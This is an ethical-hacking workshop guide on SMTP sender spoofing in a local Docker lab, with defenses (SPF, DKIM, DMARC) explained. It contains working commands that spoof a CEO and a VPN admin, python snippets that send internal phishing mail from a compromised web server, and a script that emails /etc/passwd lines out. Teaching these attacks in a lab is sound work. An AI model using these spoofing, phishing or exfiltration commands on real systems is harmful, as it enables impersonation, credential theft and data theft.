# Warning
This workshop is for educational purposes only, as part of the WOCSA ethical hacking workshops.
All activities take place inside the controlled CyberRange lab (Docker, localhost, fictional domains).
Never send spoofed mail to real people, real companies, or real mail servers - that is illegal and harmful.
The lab mail gateway (Mailpit) is deliberately open; real mail servers are not.

# Table of Contents
- [Warning](#warning)
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Lab setup](#lab-setup)
- [Part 1 — SMTP basics](#part-1--smtp-basics)
- [Part 2 — Spoofing the sender](#part-2--spoofing-the-sender)
- [Part 3 — Header analysis](#part-3--header-analysis)
- [Part 4 — Abuse from inside (attacker perspective)](#part-4--abuse-from-inside-attacker-perspective)
- [Part 5 — Defenses (SPF/DKIM/DMARC explained)](#part-5--defenses-spfdkimdmarc-explained)
- [Lab exercises](#lab-exercises)
- [Defense & detection recap](#defense--detection-recap)
- [Takeaways checklist](#takeaways-checklist)
- [Resources](#resources)

# Introduction
SMTP (Simple Mail Transfer Protocol) was defined in 1982 (RFC 821) and it is still the backbone of all e-mail, 40+ years later. It was designed for a friendly academic network: any host could submit mail for any sender, and nobody verified anything. That legacy has never been removed for backwards-compatibility reasons - so **spoofing a sender address is still trivial**: the protocol simply trusts whatever the client types after `MAIL FROM` and in the `From:` header. The modern mail security ecosystem (SPF, DKIM, DMARC) was bolted on top of SMTP decades later to patch exactly this flaw, but only works if the receiving server checks the records and enforces the policies. In this lab, Mailpit (a developer mail catcher) implements bare SMTP with no authentication, no anti-spoofing checks, and no enforcement - a perfect playground to see, hands-on, why spoofed mail works and what real mail servers do to stop it.

# Prerequisites
- Docker with the Compose plugin.
- The CyberRange DMZ profile running (brings the mail gateway + the victim inbox):
```bash
cd CyberRange
docker compose --profile dmz up -d
```
- A mail client tool:
  - **swaks** (recommended) - available inside the `kali-cai` attacker container of the AI/offensive lab (`docker exec -it kali-cai bash`), or `sudo apt install swaks` on any Debian/Kali machine.
  - **netcat** (`nc`) - the manual fallback used in Part 1.
- `curl` and `python3` (already on any standard Linux box and inside the DVWA container).

# Lab setup
The CyberRange DMZ contains the fictional company **WOCSA Corp**:
- `mailpit` (axllent/mailpit, container IP `10.5.10.13`) plays the role of the company **mail gateway and inbox**. It has two published ports:
  - **1025 (SMTP)**: accepts any connection, any envelope sender, no AUTH, no TLS - it will accept mail "from" anyone.
  - **8025 (HTTP)**: web UI + JSON API to read everything that was received.
- `corporate-site` (`localhost:8080`) advertises the company address `contact@wocsa-corp.local` - a realistic address format you can target or impersonate.
- `dvwa` (`localhost:8081`, credentials `admin` / `password`) is the DMZ web server you will "pwn" in Part 4 to send mail from inside the company network.

The fictional victim inbox: anything sent to `*@wocsa-corp.local` lands in Mailpit's single shared inbox. There is no spam filter, no reputation check, no DNS - Mailpit catches everything, which is exactly why it shows spoofing in its rawest form.

> All names, addresses and domains in this lab are fictional (`wocsa-corp.local` does not resolve publicly). Keep every message inside the lab.

# Part 1 — SMTP basics
SMTP is a plain-text line protocol: the client sends commands, the server replies with 3-digit codes (`220` greeting, `250` OK, `354` go ahead with the data, `221` closing). Let's have the full conversation by hand with netcat against the lab gateway.

Open a raw connection:
```bash
nc localhost 1025
```
Then type (or paste) the following lines, and read the replies:

```
HELO attacker.lab
250 <reply from mailpit>
MAIL FROM:<student@wocsa-ethhack.lab>
250 <reply from mailpit>
RCPT TO:<victim@wocsa-corp.local>
250 <reply from mailpit>
DATA
354 <reply from mailpit: go ahead, end with .>
From: student@wocsa-ethhack.lab
To: victim@wocsa-corp.local
Subject: My first raw SMTP mail

Hello victim,
This message was typed by hand into a TCP socket.
.
250 <reply from mailpit: message accepted>
QUIT
221 <reply from mailpit: bye>
```

Annotated transcript:
- `HELO attacker.lab` - the client introduces itself. The name is **not verified**; `EHLO` is the modern extended version. You can claim to be anything.
- `MAIL FROM:<...>` - the **envelope sender**. This is where bounces go. It is whatever you type. Not verified.
- `RCPT TO:<...>` - the **envelope recipient**. This decides actual delivery routing.
- `DATA` + headers + blank line + body, terminated by a line containing only `.`.
- `QUIT` - end of session.

**Envelope vs header `From:`** - the two most important addresses of a message:
- The *envelope sender* (`MAIL FROM`) is used between mail servers to route and bounce; the end user normally never sees it (it appears in the `Return-Path:` header).
- The *header `From:`* is what the recipient's mail client displays.
- Nothing forces them to match. An attacker can put a legitimate-looking display `From:` while the envelope sender is a throwaway address.

Verify the mail arrived: open `http://localhost:8025` in a browser, or use the API:
```bash
curl -s http://localhost:8025/api/v1/messages
```
The JSON lists messages with their IDs; pick the newest ID and fetch the raw source:
```bash
curl -s http://localhost:8025/api/v1/message/<ID>/raw
```

# Part 2 — Spoofing the sender
Now impersonate the CEO of the fictional company, sending to HR - with no authentication whatsoever. The gateway will happily accept it.

With swaks (from the kali-cai container, or any machine with swaks installed):
```bash
swaks --server localhost:1025 \
  --from ceo@wocsa-corp.local \
  --to hr@wocsa-corp.local \
  --header "Subject: Urgent: bonus list approval" \
  --body "Hello HR team, please send me the bonus list for Q4. This is urgent. - The CEO"
```
Or with netcat, the same handshake as Part 1:
```bash
nc localhost 1025 <<'EOF'
HELO smtp.wocsa-corp.local
MAIL FROM:<ceo@wocsa-corp.local>
RCPT TO:<hr@wocsa-corp.local>
DATA
From: ceo@wocsa-corp.local
To: hr@wocsa-corp.local
Subject: Urgent: bonus list approval

Hello HR team, please send me the bonus list for Q4. This is urgent. - The CEO
.
QUIT
EOF
```

Check the result:
- Browser: `http://localhost:8025` - the message is in the inbox, displayed as coming from the CEO.
- Raw source:
```bash
curl -s http://localhost:8025/api/v1/message/<ID>/raw
```

Read the raw source carefully. There is:
- **no check** that the sender owns `wocsa-corp.local`,
- **no signature** proving the message was authorized,
- **no indication** it was altered,
- nothing but the word of the connecting client.

The lab accepted a message "from the CEO" typed by a random socket on localhost. On the open Internet, the same thing happens against any mail server that does not enforce SPF/DKIM/DMARC - and that is precisely why these defenses exist.

# Part 3 — Header analysis
Take a real message from the lab inbox (the one you just sent) and dump its raw source:
```bash
curl -s http://localhost:8025/api/v1/message/<ID>/raw
```
Mailpit's own copy looks like this (abbreviated):

```
Message-ID: <...generated by mailpit...>
Date: Sat, 19 Sep 2026 12:00:00 +0000
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Subject: Urgent: bonus list approval
To: hr@wocsa-corp.local
From: ceo@wocsa-corp.local
X-Mailpit-Note: This is a mailpit note.
Return-Path: ceo@wocsa-corp.local
```

Annotated header by header:
- `Return-Path:` - recorded from your `MAIL FROM` envelope. Note that **it was taken at face value**; a real receiving MTA would also write this from the envelope, but only after validating it.
- `From:` - the display address you typed in `DATA`. **No validation** connects it to the envelope or to any real identity.
- `To:` / `Subject:` - pure display metadata, freely chosen by the sender.
- `Message-ID:` / `Date:` - added by Mailpit when it stores the message. This is normal: the receiving/storing agent adds or normalizes such headers.

What is **absent** here, that a real corporate mail server would add or check:
- **`Received:` chains** - every real relay prepends a `Received:` header with the IP, hostname and protocol it saw. A real message crossing the Internet carries 3-10 `Received:` headers; forensic analysis starts there. Mailpit adds none (or a minimal one), because there is no routing.
- **`Authentication-Results:`** - a real receiving MTA (after SPF/DKIM/DMARC checks) stamps the verdict, e.g. `Authentication-Results: mail.example.com; spf=fail smtp.mailfrom=...; dkim=fail; dmarc=fail`. Here there is no such header - nothing was ever checked.
- **`Received-SPF:`** - the result of the SPF check. Absent: no DNS lookup was performed.

So in the lab you can literally see the "trusting" state of SMTP: headers are added for convenience, never for authentication.

# Part 4 — Abuse from inside (attacker perspective)
Scenario: an attacker has compromised a DMZ server (DVWA). From there, the same spoofing attack becomes an "internal phish": mail arriving "from inside the company" is trusted by users much more than external mail.

First, get a shell inside DVWA. If it's the first run, complete the setup:
1. Open `http://localhost:8081` in a browser.
2. Log in with `admin` / `password`.
3. If it asks to create/reset the database, click through the setup (`Create/Reset Database`), then log in again.

Then use the DVWA **Command Injection** page (`http://localhost:8081/vulnerabilities/exec/`) to run commands on the server. Start with reconnaissance - from DVWA, the mail gateway is reachable at its container IP:
```bash
ping -c 1 10.5.10.13
```

Send an internal-looking phish from the pwned server, directly against the mail gateway (`10.5.10.13:1025`). With python3 (available in the DVWA container), via its `smtplib`:
```bash
python3 -c '
import smtplib
s = smtplib.SMTP("10.5.10.13", 1025)
msg = "From: it-support@wocsa-corp.local\r\nTo: victim@wocsa-corp.local\r\nSubject: [INTERNAL] Password policy update\r\n\r\nDear colleague, your password expires in 24h. Verify it at http://10.5.10.12/login (internal portal).\r\n"
s.sendmail("it-support@wocsa-corp.local", ["victim@wocsa-corp.local"], msg)
s.quit()
print("sent")
'
```
If netcat is available in the container, the Part 1 handshake against `10.5.10.13 1025` works identically.

Read the inbox from the pwned host using the Mailpit API (`10.5.10.13:8025`) - the compromised server can also read every message the company received, i.e. complete visibility on the victim's mailbox:
```bash
curl -s http://10.5.10.13:8025/api/v1/messages
curl -s http://10.5.10.13:8025/api/v1/message/<ID>/raw
curl -s http://10.5.10.13:8025/api/v1/message/<ID>/html
```

This is the classic "compromised host sends internal phish" pattern:
- The attacker sends from a machine that **really is inside** the network, so perimeter anti-spoofing (SPF/DKIM/DMARC are usually checked only on the *inbound* gateway) often does not protect internal mail.
- Recipients see an internal sender, an internal-looking link, and no external Received chain.
- The same compromised host can read the inbox API to harvest conversations and craft credible follow-ups.

# Part 5 — Defenses (SPF/DKIM/DMARC explained)
Three DNS-based protocols patch SMTP's blind trust. They are published as DNS records under the **sending** domain, and enforced by the **receiving** server:

**SPF (Sender Policy Framework)** - which servers may send mail for this domain. DNS TXT record on the domain:
```
v=spf1 mx -all
```
Meaning: "only the servers listed as MX for this domain may send; everyone else fails." A receiving server looks up the domain of the envelope sender (`MAIL FROM`), checks whether the connecting IP is in the allowed list, and stamps `spf=pass` or `spf=fail` in `Authentication-Results`.

**DKIM (DomainKeys Identified Mail)** - a cryptographic signature over selected headers/body. The sending server signs with a private key; the public key is published in DNS (a TXT record at `selector._domainkey.example.com`). The receiver verifies the signature; if it matches, the mail provably came from a server holding the domain's key (and headers cannot be silently modified).

**DMARC (Domain-based Message Authentication, Reporting and Conformance)** - the policy layer that tells receivers what to do when SPF/DKIM fail:
```
v=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com
```
`p=reject` means "if neither SPF nor DKIM passes in alignment with the `From:` domain, reject the message." This is the record that actually stops spoofed mail from being delivered.

How to check real domains from the lab machine:
```bash
dig TXT google.com             # google.com has no SPF but look at _spf.google.com
dig TXT _spf.google.com
dig TXT _dmarc.google.com
dig TXT gmail.com              # gmail.com's SPF record
```
(Use `nslookup -type=TXT ...` on Windows.)

Why Mailpit has none of this: it is a developer mail catcher, deliberately dumb - it accepts everything and performs no DNS lookups, so the lab shows SMTP at its most trusting. Real mail servers (Google, Microsoft) publish strict SPF/DKIM/DMARC records, and inbound gateways of real companies enforce them - that is what makes the CEO spoof of Part 2 bounce in the real world instead of arriving in the HR inbox.

# Lab exercises
Run each one and check the expected outcome:

1. **Mismatched envelope and header From** - send a message whose `MAIL FROM` is `attacker@evil.lab` but whose `From:` header is `ceo@wocsa-corp.local`. Open the raw source in the API and observe that both addresses were stored as-is, side by side, with zero validation.
```bash
swaks --server localhost:1025 --from attacker@evil.lab --to victim@wocsa-corp.local \
  --header "From: ceo@wocsa-corp.local" --header "Subject: Mismatched envelope/header" \
  --body "Compare Return-Path and From in the raw source."
```
   *Expected outcome:* the message is delivered; `Return-Path` differs from `From`, and nothing rejected it.

2. **Forged VPN admin phish** - pretend to be the company VPN administrator asking the victim to "verify their password" on a link pointing to the phishing workshop clone. Connect this exercise to the Phishing workshop (clone the corporate site at `localhost:8080`, serve the fake login form, and send the mail with your clone's URL).
```bash
swaks --server localhost:1025 --from vpn-admin@wocsa-corp.local --to victim@wocsa-corp.local \
  --header "Subject: [ACTION REQUIRED] VPN password verification" \
  --body "Your VPN certificate expires today. Verify your password at http://<your-clone-ip>/vpn (internal)."
```
   *Expected outcome:* the phish lands in the inbox with the sender shown as the VPN admin - a textbook social-engineering mail.

3. **Missing anti-spoofing headers audit** - read the raw source of one of your own mails (`curl -s http://localhost:8025/api/v1/message/<ID>/raw`) and write down the list of headers a real gateway would have added or checked: `Authentication-Results`, `Received-SPF`, multiple `Received:` hops. Compare with a real mail from your personal inbox (look at its headers in Gmail/Outlook "Show original").
   *Expected outcome:* you can name at least three authentication headers absent in the lab and present in real mail.

4. **Data exfiltration by email from DVWA** - as the attacker inside the pwned DMZ server, email the output of `whoami` (or the first lines of `/etc/passwd`) to your own lab address, then read it back through the API.
```bash
python3 -c '
import smtplib, subprocess
data = subprocess.check_output("whoami; head -n 5 /etc/passwd", shell=True).decode()
s = smtplib.SMTP("10.5.10.13", 1025)
msg = "From: root@dvwa.internal\r\nTo: student@wocsa-ethhack.lab\r\nSubject: exfil\r\n\r\n" + data + "\r\n"
s.sendmail("root@dvwa.internal", ["student@wocsa-ethhack.lab"], msg)
s.quit()
print("exfiltrated")
'
```
   *Expected outcome:* the exfiltrated output appears in the lab inbox - demonstrating that egress over SMTP (port 1025) is a real exfiltration channel when the mail gateway is reachable from a compromised host.

# Defense & detection recap
How real organizations close every hole exploited in this workshop:
- **Mail gateway checks**: inbound relays enforce SPF/DKIM/DMARC before delivery, reject or quarantine failures, and rate-limit/authenticate submission (SMTP AUTH, TLS, submission port 587). This kills Part 2 from the outside.
- **Open relays are dead**: for decades, any server that accepted mail for any destination and forwarded it was an "open relay" - the spammer's dream and the direct ancestor of the lab's Mailpit. They were systematically blacklisted; every legitimate server now accepts mail only for its own domains and requires authentication for submission.
- **User awareness**: even with all technical controls, the attacker pivots to the human. Training users to check the real sender, hover links, and question urgency is the last line of defense - exactly what Part 4 and exercise 2 exploit.
- **Internal mail is not automatically safe**: DMARC/SPF usually protect only the inbound path. Segment internal mail, require DKIM on internal relays too, and monitor for mail sent by servers that normally never send mail (that is what a SIEM would flag in exercise 4).

# Takeaways checklist
- [ ] I manually completed an SMTP conversation (HELO/MAIL FROM/RCPT TO/DATA/QUIT) with `nc` and understood every reply.
- [ ] I can explain the difference between the envelope sender (`MAIL FROM` / `Return-Path`) and the header `From:`.
- [ ] I spoofed a mail as `ceo@wocsa-corp.local` and confirmed it was delivered without any authentication.
- [ ] I read the raw source via the Mailpit API and listed the anti-spoofing headers a real server would add.
- [ ] From the pwned DVWA container I sent internal-looking mail to `10.5.10.13:1025` and read the inbox via `10.5.10.13:8025`.
- [ ] I exfiltrated data (whoami / /etc/passwd head) by email and retrieved it.
- [ ] I can explain SPF, DKIM and DMARC, their DNS records (`v=spf1 mx -all`, `p=reject`), and why Mailpit deliberately has none.
- [ ] I understand why open relays disappeared and how mail gateways + user awareness defend against each attack in this lab.

# Resources
- Mailpit: https://github.com/axllent/mailpit (SMTP/API reference used in this lab)
- SPF specification and checkers: https://www.rfc-editor.org/rfc/rfc7208 , https://dmarcian.com/spf-survey/
- DKIM specification: https://www.rfc-editor.org/rfc/rfc6376
- DMARC specification: https://www.rfc-editor.org/rfc/rfc7489 , https://dmarc.org
- Learn and test SPF/DKIM/DMARC safely: https://www.learndmarc.com
- CyberRange (this lab): ../CyberRange/README.md (see `../../CyberRange/README.md` from this file)

Summary: This workshop demonstrated on the CyberRange Mailpit gateway (10.5.10.13:1025/8025) that SMTP is a 40-year-old protocol with zero sender authentication - envelope and header From can be arbitrarily forged by anyone, a pwned DMZ host can send internal-looking phish and read the whole inbox via the API, and only the modern SPF/DKIM/DMARC ecosystem plus gateway enforcement and user awareness stop these abuses in the real world.
